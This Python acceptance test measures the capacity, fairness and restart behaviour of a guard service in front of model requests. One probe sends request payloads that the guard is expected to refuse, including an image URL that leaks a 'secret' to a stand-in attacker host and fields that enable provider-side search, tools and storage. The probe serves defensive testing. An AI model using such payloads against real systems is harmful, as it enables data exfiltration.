"""Capacity and concurrency acceptance through the production-linux-peer-bound
deployment (separate agent UIDs, peer binding, network-less Guard, egress proxy,
synthetic TLS upstream). Targets: docs/operations/capacity-targets-production.json,
committed before measurement. Writes verification/0.5.0rc2/production-capacity.json.

Usage: GUARD_TEST_IMAGE=enkstein-guard:0.5.0rc2 python deployment/test_production_capacity.py [--quick]
"""
import argparse
import hashlib
import json
from pathlib import Path
import sys
import threading
import time

sys.path.insert(0, str(Path(__file__).resolve().parent))
from production_harness import (ROOT, AgentRun, Deployment, capacity_config, participation, percentile,  # noqa: E402
                                plan_for, write_report)

OFFERED_FRACTION_MIN = 0.95  # measurement rule: rate-driven agents issue at least 95 % of their offered requests

TARGETS = ROOT / "docs/operations/capacity-targets-production.json"
PROBE = r"""
import asyncio, json
from pathlib import Path
from enkstein_guard.outcomes import new_request_id
from enkstein_guard.service import guarded_request
token = Path("/run/agent-token").read_text().strip()
text = {"role": "user", "content": "describe"}
attacks = {
    "image_url": {"messages": [{"role": "user", "content": [{"type": "text", "text": "x"},
        {"type": "image_url", "image_url": {"url": "https://attacker.example.test/p.png?d=secret"}}]}]},
    "web_search": {"messages": [text], "web_search_options": {}},
    "hosted_tool": {"messages": [text], "tools": [{"type": "web_search"}]},
    "store": {"messages": [text], "store": True, "metadata": {"copy": "secret"}},
}
async def main():
    result = {}
    for name, payload in attacks.items():
        response = await guarded_request("/run/guard/guard.sock", token, "a.model-plain", payload,
                                         request_id=new_request_id())
        result[name] = response.get("status")
    print(json.dumps(result))
asyncio.run(main())
"""


class Sampler(threading.Thread):
    def __init__(self, deployment, every):
        super().__init__(daemon=True)
        self.deployment, self.every, self.samples, self.stop = deployment, every, [], threading.Event()

    def run(self):
        while not self.stop.is_set():
            try:
                self.samples.append(self.deployment.sample())
            except Exception as error:
                self.samples.append({"t": time.time(), "error": type(error).__name__})
            self.stop.wait(self.every)

    def summary(self):
        def values(name, key):
            return [s[name]["process"][key] for s in self.samples
                    if s.get(name) and s[name].get("process")]
        return {"samples": len(self.samples),
                "guard_rss_mib_max": round(max(values("guard", "rss_kib"), default=0) / 1024, 1),
                "guard_fds_max": max(values("guard", "fds"), default=None),
                "guard_threads_max": max(values("guard", "threads"), default=None),
                "egress_rss_mib_max": round(max(values("egress", "rss_kib"), default=0) / 1024, 1),
                "egress_fds_max": max(values("egress", "fds"), default=None)}


def run_agents(deployment, jobs, *, timeout, sample_every=5, during=None):
    """Start one load container per (agent, args); sample until all exit."""
    sampler = Sampler(deployment, sample_every)
    sampler.start()
    processes = {agent: AgentRun(deployment.agent(agent, args)) for agent, args in jobs}
    if during is not None:
        during()
    results = {agent: run.result(timeout) for agent, run in processes.items()}
    sampler.stop.set()
    sampler.join(timeout=sample_every + 60)
    return results, sampler.summary()


def merge(results, *agents):
    statuses, latencies, probes, lost, lost_total = {}, [], {}, {}, 0
    for agent in agents or results:
        summary = results[agent]["summary"] or {}
        lost_total += summary.get("lost_responses", 0)
        for key, value in summary.get("statuses", {}).items():
            statuses[key] = statuses.get(key, 0) + value
        latencies += summary.get("latencies_ms", [])
        for key, value in summary.get("dedup_probes", {}).items():
            probes[key] = probes.get(key, 0) + value
        for key, value in summary.get("lost_resubmitted", {}).items():
            lost[key] = lost.get(key, 0) + value
    return {"statuses": statuses, "requests": sum(statuses.values()), "p50_ms": percentile(latencies, .5),
            "p95_ms": percentile(latencies, .95), "p99_ms": percentile(latencies, .99),
            "max_ms": round(max(latencies), 1) if latencies else None, "dedup_probes": probes,
            "lost_resubmitted": lost, "lost_responses": lost_total}


def load_args(tenant, *, duration, rate=None, concurrency=None, extra=()):
    args = ["--plan", json.dumps(plan_for(tenant)), "--duration", str(duration), "--emit-latencies",
            "--window", "30"]
    args += ["--rate", str(rate)] if rate else ["--concurrency", str(concurrency)]
    return args + list(extra)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--quick", action="store_true", help="short durations for a harness check (not evidence)")
    options = parser.parse_args()
    targets = json.loads(TARGETS.read_text())
    target = {item["id"]: item for item in targets["targets"]}
    scale = 0.05 if options.quick else 1.0
    config = capacity_config(rate=40, capacity=200000, archive_age=3600, archive_interval=300)
    deployment = Deployment(config, label="capacity", upstream_mode="count")
    agents = [a["id"] for a in config["agents"]]
    share = config["service"]["max_requests_per_second"] / len(agents)
    report = {"targets": str(TARGETS.relative_to(ROOT)), "targets_sha256": hashlib.sha256(TARGETS.read_bytes()).hexdigest(),
              "targets_defined_at": targets["defined_at"], "quick_harness_check": options.quick,
              "phases": {}, "verdicts": {}}
    try:
        report["ready"] = deployment.up()
        report["evidence"] = deployment.header("production-capacity")
        code, doctor = deployment.guard_cli("doctor", check=False)
        report["doctor_mandatory_enforcement"] = doctor.get("mandatory_enforcement_status")

        # P-01 sustained mixed load
        load = target["P-01"]["load"]
        duration = max(20, load["duration_seconds"] * scale)
        before = deployment.upstream_stats()
        results, resources = run_agents(deployment, [(agent, load_args(agent[0], duration=duration,
                                                                         rate=load["requests_per_second_per_agent"]))
                                                     for agent in agents], timeout=duration + 600)
        after = deployment.upstream_stats()
        merged = merge(results)
        need = target["P-01"]["requirements"]
        non_ok = sum(v for k, v in merged["statuses"].items() if k != "ok")
        ran = participation(results, agents, minimum_requests=int(
            OFFERED_FRACTION_MIN * load["requests_per_second_per_agent"] * duration))
        report["phases"]["P-01"] = {"duration_seconds": duration, **merged, "resources": resources,
                                    "participation": ran,
                                    "upstream_before": before, "upstream_after": after,
                                    "agents": {a: {k: v for k, v in (r["summary"] or {}).items() if k != "latencies_ms"}
                                               for a, r in results.items()}}
        report["verdicts"]["P-01"] = {"passed": bool(
            ran["complete"] and merged["requests"] and non_ok <= need["non_ok_statuses_max"]
            and merged["p50_ms"] <= need["p50_ms_max"] and merged["p95_ms"] <= need["p95_ms_max"]
            and merged["p99_ms"] <= need["p99_ms_max"]
            and resources["guard_rss_mib_max"] <= need["guard_rss_mib_max"]
            and resources["egress_rss_mib_max"] <= need["egress_rss_mib_max"]
            and (resources["guard_fds_max"] or 0) <= need["guard_fds_max"]
            and after and after["duplicate_markers"] <= need["upstream_duplicate_markers_max"]
            and set(merged["dedup_probes"]) == {need["dedup_probe_status"]}),
            "measured": {"agents_complete": ran["complete"], "requests": merged["requests"], "non_ok": non_ok,
                         "p50_ms": merged["p50_ms"],
                         "p95_ms": merged["p95_ms"], "p99_ms": merged["p99_ms"], **resources,
                         "duplicate_markers": after and after["duplicate_markers"], "dedup_probes": merged["dedup_probes"]}}

        # P-02 saturation at the per-peer connection limit
        load = target["P-02"]["load"]
        duration = max(20, load["duration_seconds"] * scale)
        status_before, upstream_before = deployment.status(), deployment.upstream_stats()
        results, resources = run_agents(deployment, [(agent, load_args(agent[0], duration=duration,
                                                                         concurrency=load["concurrency_per_agent"]))
                                                     for agent in agents], timeout=duration + 600)
        status_after, upstream_after = deployment.status(), deployment.upstream_stats()
        merged = merge(results)
        need = target["P-02"]["requirements"]
        ok = merged["statuses"].get("ok", 0)
        per_agent_ok = {a: (r["summary"] or {}).get("statuses", {}).get("ok", 0) for a, r in results.items()}
        burst = max(1.0, share * 2)
        model_ok = sum((r["summary"] or {}).get("by_route", {}).get(route, {}).get("ok", 0)
                       for r in results.values() for route in (r["summary"] or {}).get("by_route", {})
                       if ".model" in route)
        tracked = status_after["tracked_requests"] - status_before["tracked_requests"] if status_before and status_after else None
        executed = upstream_after["requests"] - upstream_before["requests"] if upstream_before and upstream_after else None
        ran = participation(results, agents)
        report["phases"]["P-02"] = {"duration_seconds": duration, **{k: v for k, v in merged.items()},
                                    "per_agent_ok": per_agent_ok, "model_ok": model_ok, "tracked_requests": tracked,
                                    "upstream_requests": executed, "resources": resources, "participation": ran}
        report["verdicts"]["P-02"] = {"passed": bool(
            ran["complete"] and set(merged["statuses"]) <= set(need["allowed_statuses"])
            and ok >= need["ok_fraction_of_configured_rate_min"] * config["service"]["max_requests_per_second"] * duration
            and all(count <= need["admitted_per_agent_rate_max_factor"] * share * duration + burst
                    for count in per_agent_ok.values())
            and merged["p95_ms"] is not None and merged["p95_ms"] <= need["ok_p95_ms_max"]
            and tracked == ok and executed == model_ok),
            "measured": {"agents_complete": ran["complete"], "statuses": merged["statuses"], "ok": ok,
                         "per_agent_ok": per_agent_ok,
                         "ok_required_min": need["ok_fraction_of_configured_rate_min"]
                         * config["service"]["max_requests_per_second"] * duration,
                         "p95_ms": merged["p95_ms"], "tracked_requests": tracked, "upstream_requests": executed,
                         "model_ok": model_ok}}

        # P-03 fairness under a flooding agent
        load = target["P-03"]["load"]
        duration = max(20, load["duration_seconds"] * scale)
        results, resources = run_agents(deployment, [
            (load["flooder"], load_args(load["flooder"][0], duration=duration, concurrency=load["flooder_concurrency"])),
            (load["light"], load_args(load["light"][0], duration=duration, rate=load["light_requests_per_second"]))],
            timeout=duration + 600)
        light, flooder = merge(results, load["light"]), merge(results, load["flooder"])
        need = target["P-03"]["requirements"]
        light_ok = light["statuses"].get("ok", 0) / max(1, light["requests"])
        ran = {"light": participation(results, [load["light"]], minimum_requests=int(
                   OFFERED_FRACTION_MIN * load["light_requests_per_second"] * duration)),
               "flooder": participation(results, [load["flooder"]])}
        report["phases"]["P-03"] = {"duration_seconds": duration, "light": light, "flooder": flooder,
                                    "resources": resources, "participation": ran}
        report["verdicts"]["P-03"] = {"passed": bool(
            ran["light"]["complete"] and ran["flooder"]["complete"]
            and light["requests"] and light_ok >= need["light_ok_fraction_min"] and light["p95_ms"] <= need["light_p95_ms_max"]
            and set(flooder["statuses"]) <= set(need["flooder_allowed_statuses"])),
            "measured": {"agents_complete": ran["light"]["complete"] and ran["flooder"]["complete"],
                         "light_ok_fraction": round(light_ok, 4), "light_p95_ms": light["p95_ms"],
                         "flooder_statuses": flooder["statuses"]}}

        # P-04 forced restart under load
        load = target["P-04"]["load"]
        duration = max(30, load["duration_seconds"] * scale)
        restart = {}

        def kill_and_restart():
            # A quick harness check still waits until slow requests are in flight.
            time.sleep(max(10, load["kill_guard_after_seconds"] * scale) if options.quick
                       else load["kill_guard_after_seconds"])
            started = time.time()
            deployment.compose("kill", "guard")
            deployment.compose("up", "-d", "--no-color", "guard")
            try:
                deployment.wait_ready(timeout=180)
                restart["ready_seconds"] = round(time.time() - started, 1)
            except RuntimeError:
                restart["ready_seconds"] = None

        thread = threading.Thread(target=kill_and_restart)
        # Some requests are slow at the upstream, so executed requests are in
        # flight when Guard is killed and their responses are lost.
        slow = ["--resubmit-lost", "--slow-every", str(load["slow_request_every"]),
                "--slow-ms", str(load["slow_request_ms"])]
        results, resources = run_agents(deployment, [(agent, load_args(agent[0], duration=duration,
                                                                         rate=load["requests_per_second_per_agent"],
                                                                         extra=slow))
                                                     for agent in agents], timeout=duration + 900,
                                        during=thread.start)
        thread.join(timeout=300)
        merged = merge(results)
        stats = deployment.upstream_stats()
        need = target["P-04"]["requirements"]
        ran = participation(results, agents, minimum_requests=int(
            OFFERED_FRACTION_MIN * load["requests_per_second_per_agent"] * duration))
        resubmitted = sum(merged["lost_resubmitted"].values())
        after_admission = sum(merged["lost_resubmitted"].get(status, 0)
                              for status in ("completed_no_replay", "outcome_unknown_no_replay"))
        report["phases"]["P-04"] = {"duration_seconds": duration, **merged, "restart": restart, "upstream": stats,
                                    "resources": resources, "participation": ran}
        report["verdicts"]["P-04"] = {"passed": bool(
            ran["complete"] and stats and stats["duplicate_markers"] <= need["upstream_duplicate_markers_max"]
            and set(merged["lost_resubmitted"]) <= set(need["lost_resubmission_statuses"])
            and (resubmitted == merged["lost_responses"] or not need["all_lost_resubmitted"])
            and after_admission >= need["lost_after_admission_resubmissions_min"]
            and restart.get("ready_seconds") is not None
            and restart["ready_seconds"] <= need["ready_after_restart_seconds_max"]),
            "measured": {"agents_complete": ran["complete"], "duplicate_markers": stats and stats["duplicate_markers"],
                         "lost_responses": merged["lost_responses"], "lost_resubmitted": merged["lost_resubmitted"],
                         "lost_after_admission_resubmitted": after_admission,
                         "ready_seconds": restart.get("ready_seconds"),
                         "statuses_during_restart": merged["statuses"]}}

        # P-05 provider-side fetch and tool fields refused before dispatch
        before = deployment.upstream_stats()
        agent = config["agents"][0]
        probe = deployment.compose("run", "--rm", "--no-deps", "-T", "--user", "%d:10001" % agent["uid"],
                                   "-v", str(deployment.run / "credentials" / (agent["id"] + ".token"))
                                   + ":/run/agent-token:ro", "--entrypoint", "python", "agent", "-c", PROBE,
                                   check=False, timeout=300)
        refused = json.loads(probe.stdout.strip().splitlines()[-1]) if probe.stdout.strip() else {}
        time.sleep(2)
        after = deployment.upstream_stats()
        need = target["P-05"]["requirements"]
        added = after["requests"] - before["requests"] if before and after else None
        report["phases"]["P-05"] = {"statuses": refused, "upstream_requests_added": added}
        report["verdicts"]["P-05"] = {"passed": bool(refused and set(refused.values()) <= set(need["refused_statuses"])
                                                     and added is not None and added <= need["upstream_requests_added_max"]),
                                      "measured": {"statuses": refused, "upstream_requests_added": added}}

        code, verified = deployment.guard_cli("audit", "verify", "--with-archives", check=False)
        report["audit_verified"] = code == 0
        report["final_status"] = {k: v for k, v in (deployment.status() or {}).items()
                                  if k in ("outcomes", "audit", "vault", "rate_limit", "tracked_requests",
                                           "unsettled_outcomes", "retention", "outcome_sizing", "connections")}
    except Exception as error:
        report["error"] = deployment.redact(str(error))[-3000:]
        report["diagnostic_logs"] = deployment.logs()
    finally:
        deployment.down()
    report["passed"] = bool(report["verdicts"]) and all(v["passed"] for v in report["verdicts"].values()) and \
        len(report["verdicts"]) == len(target) and report.get("audit_verified") is True and "error" not in report
    if not options.quick:
        write_report("production-capacity.json", report)
    else:
        print(json.dumps(report, indent=1)[:20000])
    print(json.dumps({"passed": report["passed"], "verdicts": {k: v["passed"] for k, v in report["verdicts"].items()},
                      "error": report.get("error")}))
    return 0 if report["passed"] else 1


if __name__ == "__main__":
    raise SystemExit(main())
